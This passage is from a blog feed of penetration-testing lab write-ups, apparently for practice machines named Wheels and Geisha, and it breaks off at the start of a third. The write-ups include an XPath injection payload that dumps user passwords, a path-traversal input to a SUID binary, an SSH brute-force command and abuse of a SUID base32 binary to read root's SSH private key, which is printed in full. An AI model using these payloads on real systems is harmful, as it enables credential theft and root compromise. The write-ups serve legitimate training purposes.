|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Wheels - Car Repair Services
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The outputs highlighted the HTTP (port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt;) and SSH (port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;22&lt;/code&gt;). Let’s us initially look at HTTP service listening on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;http&quot;&gt;&lt;strong&gt;HTTP&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;spoofed-employee-account&quot;&gt;&lt;strong&gt;Spoofed Employee Account&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/register.php&lt;/code&gt; page, the tester started signing up an account using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp Suite&lt;/code&gt;. It is worth to notice that the company’s email domain is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@wheels.service&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/wheels/1.png&quot; title=&quot;wheels/1.png&quot; alt=&quot;wheels/1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The response was successful. In other words, anyone can become an employee. The tester proceeded to login with the registered account and successfully landed on the restricted &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;portal&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/wheels/2.png&quot; title=&quot;wheels/2.png&quot; alt=&quot;wheels/2.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Search&lt;/code&gt; users by services can be manipulated from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url&lt;/code&gt;, via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;work&lt;/code&gt; parameter. Referring to the following example, the tester tried to pull information of all employees by submitting a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blank&lt;/code&gt; input.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/wheels/3.png&quot; title=&quot;wheels/3.png&quot; alt=&quot;wheels/3.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Furthermore, attention that an error prompted: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XML Error; No entity found&lt;/code&gt; regardless. Further examining with different inputs revealing that a single quote (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;&lt;/code&gt;) would render an invalid &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xpath()&lt;/code&gt; query.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/wheels/4.png&quot; title=&quot;wheels/4.png&quot; alt=&quot;wheels/4.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;xpath-injection-attack&quot;&gt;&lt;strong&gt;XPath Injection Attack&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;Moving on, the tester carried out different xpath payloads. It is kind of a blind attack since we weren’t sure how the vulnerable codes look like.&lt;/p&gt;

&lt;p&gt;The server codes might look like the following (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HackTricks&lt;/code&gt;):&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/user/username[contains&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;., &lt;span class=&quot;s1&quot;&gt;&apos;+VALUE+&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And if our input looks like below:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;&apos;)] | //user/*[1] | a[(&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When the code was fed into the server, it will eventually became (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQL injection&lt;/code&gt;):&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/user/username[contains&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;., &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt; | //user/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1] | a[&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With that in mind, we don’t know yet whether the root node is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;//user&lt;/code&gt;. We can brute force it, but we can also use wildcard (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt;) to mine all information from the root node.&lt;/p&gt;

&lt;p&gt;The final payload is as the follow:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s1&quot;&gt;&apos;)] | //* | a[(&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/wheels/5.png&quot; title=&quot;wheels/5.png&quot; alt=&quot;wheels/5.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;From the above photo, the tester had successfully obtained information of all users, including their passwords.&lt;/p&gt;

&lt;h1 id=&quot;initial-access&quot;&gt;&lt;strong&gt;Initial Access&lt;/strong&gt;&lt;/h1&gt;
&lt;h2 id=&quot;ssh&quot;&gt;&lt;strong&gt;SSH&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Amongst the acquired credentials, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bob&lt;/code&gt; user yielded a successful &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; login attempt. From there, the tester &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt;ed into the target system under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bob&lt;/code&gt; permission.&lt;/p&gt;

&lt;p&gt;Local enumeration revealed a few interesting informations, such as databases and configurations. Noticeably, there existed a misconfigured &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUID&lt;/code&gt; binary, named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get-list&lt;/code&gt;, which gave one permission to arbitrarily read any files in the system if exploited successfully.&lt;/p&gt;

&lt;p&gt;Using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; tool to have an overview over the binary, we found that:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The binary is trying to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command to read files.&lt;/li&gt;
  &lt;li&gt;It needs the present of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;customers&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;employees&lt;/code&gt; in the input (found that through experiment).&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;|&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; are ignored&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tester㉿kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Documents/ospg/machines/wheels]                    
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings get-list                                

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...SNIP...]

Which List &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to open? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;customers/employees]: 
customers
employees
Opening File....
/bin/cat /root/details/%s
/dev/null
Oops something went wrong!!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When we submit a value, the program will feed our input into the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/cat /root/details/&amp;lt;input&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Assuming our input is: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../proof.txt #customers&lt;/code&gt;. The program will run:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/cat /root/details/../proof.txt &lt;span class=&quot;c&quot;&gt;#customers &lt;/span&gt;
&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; This is a valid &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;and can bypass security check. &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A successful exploit returned the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; flag. Yet, we can essentially read any file systems.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bob@wheels:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./get-list 


Which List &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to open? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;customers/employees]: ../proof.txt &lt;span class=&quot;c&quot;&gt;#customers&lt;/span&gt;
Opening File....

789bbd990a3af182f511f18b80861ce8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="ospg" /><category term="red" /><category term="linux" /><summary type="html">Summary The registration mechanism of the website allowed the tester to sign up as a company employee. Landing on the employee portal, the tester discovered a XPATH injection vulnerability in the search tool. Successful exploitation of this weakness will infiltrate sensitive information of numerous users. Amongst them, bob’s account granted the tester access into the system via the ssh service. Privilege escalation is done by exploiting a custom SUID binary, named get-list, letting one to arbitrarily read any system files.</summary></entry><entry><title type="html">Geisha - OSPG</title><link href="https://jayngng.github.io/blog/geisha-ospg/" rel="alternate" type="text/html" title="Geisha - OSPG" /><published>2021-11-15T06:50:45+11:00</published><updated>2021-11-15T06:50:45+11:00</updated><id>https://jayngng.github.io/blog/geisha---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/geisha-ospg/">&lt;h2 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;We’ll obtain the initial access by brute-force SSH password of the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;geisha&lt;/code&gt;. Privilege escalation can be done via a misconfigured &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUID&lt;/code&gt; binary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base32&lt;/code&gt;, which we’ll abuse to expose &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; SSH private key and fully compromise &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; access.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Let us begin with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE SERVICE       REASON         VERSION
21/tcp   open  ftp           syn-ack ttl 63 vsftpd 3.0.3      
22/tcp   open  ssh           syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                     
80/tcp   open  http          syn-ack ttl 63 Apache httpd 2.4.38 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.38 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                        
|_http-title: Geisha
7080/tcp open  ssl/empowerid syn-ack ttl 63 LiteSpeed                            
| http-methods:       
|_  Supported Methods: GET HEAD POST             
|_http-server-header: LiteSpeed
|_http-title: Did not follow redirect to https://192.168.199.82:7080/      
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;geisha/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;webadmin/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;US/X509v3 Subject Alternative &lt;span class=&quot;nv&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;DNS.1&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;42.114.248.217
| Issuer: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;geisha/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;webadmin/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;US/X509v3 Subject Alternative &lt;span class=&quot;nv&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;DNS.1&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;42.114.248.217
7125/tcp open  http          syn-ack ttl 62 nginx 1.17.10
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.17.10
|_http-title: Geisha
8088/tcp open  http          syn-ack ttl 63 LiteSpeed httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: LiteSpeed
|_http-title: Geisha
9198/tcp open  http          syn-ack ttl 63 SimpleHTTPServer 0.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Python 2.7.16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: SimpleHTTP/0.6 Python/2.7.16
|_http-title: Geisha
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Conducting a few web directory scans, we discovered the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/passwd&lt;/code&gt; file on the HTTP service port 7125, which divulged &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;geisha&lt;/code&gt; user.&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h2&gt;

&lt;h4 id=&quot;ssh-brute-force&quot;&gt;&lt;strong&gt;SSH Brute-force&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;patator&lt;/code&gt; against the server, after a few minutes, we found &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;geisha&lt;/code&gt; credentials.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;atator ssh_login &lt;span class=&quot;nv&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.199.82 &lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;geisha &lt;span class=&quot;nv&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FILE0 &lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; ignore:mesg&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Authentication failed.&apos;&lt;/span&gt;               
03:34:21 patator    INFO - Starting Patator 0.9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/lanjelot/patator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with python-3.9.7 at 2021-11-15 03:34 EST
03:34:21 patator    INFO -                                                                              
03:34:21 patator    INFO - code  size    &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt; | candidate                          |   num | mesg
03:34:21 patator    INFO - &lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------&lt;/span&gt;
03:37:25 patator    INFO - 0     39     0.476 | letmein                            |   512 | SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
^C03:39:51 patator    INFO - Hits/Done/Skip/Fail/Size: 1/919/0/0/14344392, Avg: 2 r/s, Time: 0h 5m 29s
03:39:51 patator    INFO - To resume execution, pass &lt;span class=&quot;nt&quot;&gt;--resume&lt;/span&gt; 92,93,91,93,92,92,91,93,91,91
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this password, we can &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; our way in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;geisha&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Enumerate the system locally, we found a misconfigured &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SUID&lt;/code&gt; binary.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;geisha@geisha:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s 2&amp;gt;/dev/null&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
...                                                             
/usr/bin/base32                                                                        
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Attempting to read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; SSH private key, we are able to compromise &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; access.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;geisha@geisha:~&lt;span class=&quot;nv&quot;&gt;$ LFILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/root/.ssh/id_rsa
geisha@geisha:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base32&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LFILE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base32&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--decode&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4
OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX5
89FAL1XSEBCtzlrCrksvfX08+y7tS/I8s41w4aC1TDd5o8c1Kx5lfwl7qw0ZMlbd
5yeAUhuxuvxo/KFqiUUfpcpoBf3oT2K97/bZr059VU8T4wd5LkCzKEKmK5ebWIB6
fgIfxyhEm/o3dl1lhegTtzC6PtlhuT7ty//mqEeMuipwH3ln61fHXs72LI/vTx26
TSSmzHo8zZt+/lwrgroh0ByXbCtDaZjo4HAFfQIDAQABAoIBAQCRXy/b3wpFIcww
WW+2rvj3/q/cNU2XoQ4fHKx4yqcocz0xtbpAM0veIeQFU0VbBzOID2V9jQE+9k9U
1ZSEtQJRibwbqk1ryDlBSJxnqwIsGrtdS4Q/CpBWsCZcFgy+QMsC0RI8xPlgHpGR
Y/LfXZmy2R6E4z9eKEYWlIqRMeJTYgqsP6ZR4SOLuZS1Aq/lq/v9jqGs/SQenjRb
8zt1BoqCfOp5TtY1NoBLqaPwmDt8+rlQt1IM+2aYmxdUkLFTcMpCGMADggggtnR+
10pZkA6wM8/FlxyAFcNwt+H3xu5VKuQKdqTfh1EuO3c34UmuS1qnidHO1rYWOhYO
jceQYzoBAoGBAP/Ml6cp2OWqrheJS9Pgnvz82n+s9yM5raKNnH57j0sbEp++eG7o
2po5/vrLBcCHGqZ7+RNFXDmRBEMToru/m2RikSVYk8QHLxVZJt5iB3tcxmglGJj/
cLkGM71JqjHX/edwu2nNu14m4l1JV9LGvvHR5m6uU5cQvdcMTsRpkuxdAoGBAOOl
THxiQ6R6HkOt9w/WrKDIeGskIXj/P/79aB/2p17M6K+cy75OOYzqkDPENrxK8bub
RaTzq4Zl2pAqxvsv/CHuJU/xHs9T3Ox7A1hWqnOOk2f0KBmhQTYBs2OKqXXZotHH
xvkOgc0fqRm1QYlCK2lyBBM14O5Isud1ZZXLUOuhAoGBAIBds1z36xiV5nd5NsxE
1IQwf5XCvuK2dyQz3Gy8pNQT6eywMM+3mrv6jrJcX66WHhGd9QhurjFVTMY8fFWr
edeOfzg2kzC0SjR0YMUIfKizjf2FYCqnRXIUYrKC3R3WPlx+fg5CZ9x/tukJfUEQ
65F+vBye7uPISvw3+O8n68shAoGABXMyppOvrONjkBk9Hfr0vRCvmVkPGBd8T71/
XayJC0L6myG02wSCajY/Z43eBZoBuY0ZGL7gr2IG3oa3ptHaRnGuIQDTzQDj/CFh
zh6dDBEwxD9bKmnq5sEZq1tpfTHNrRoMUHAheWi1orDtNb0Izwh0woT6spm49sOf
v/tTH6ECgYEA/tBeKSVGm0UxGrjpQmhW/9Po62JNz6ZBaTELm3paaxqGtA+0HD0M
OuzD6TBG6zBF6jW8VLQfiQzIMEUcGa8iJXhI6bemiX6Te1PWC8NMMULhCjObMjCv
bf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa root@192.168.199.82                                                                                                                                                                        130 ⨯
Linux geisha 4.19.0-8-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64&lt;/span&gt;

The programs included with the Debian GNU/Linux system are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@geisha:~# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="ospg" /><category term="red" /><category term="linux" /><summary type="html">Summary We’ll obtain the initial access by brute-force SSH password of the user geisha. Privilege escalation can be done via a misconfigured SUID binary base32, which we’ll abuse to expose root SSH private key and fully compromise root access.</summary></entry><entry><title type="html">Reconstruction - OSPG</title><link href="https://jayngng.github.io/blog/reconstruction-ospg/" rel="alternate" type="text/html" title="Reconstruction - OSPG" /><published>2021-11-08T20:22:04+11:00</published><updated>2021-11-08T20:22:04+11:00</updated><id>https://jayngng.github.io/blog/reconstruction---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/reconstruction-ospg/">&lt;h2 id=&quot;executive-summary&quot;&gt;&lt;strong&gt;Executive Summary&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;We’ll secure an initial foothold by abusing local file inclusion vulnerability to reconstruct the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wekzeug&lt;/code&gt; web application’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PIN console&lt;/code&gt;. Privilege escalation can then be done via a disclosure of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; credentials in a history file.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;We’ll begin with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

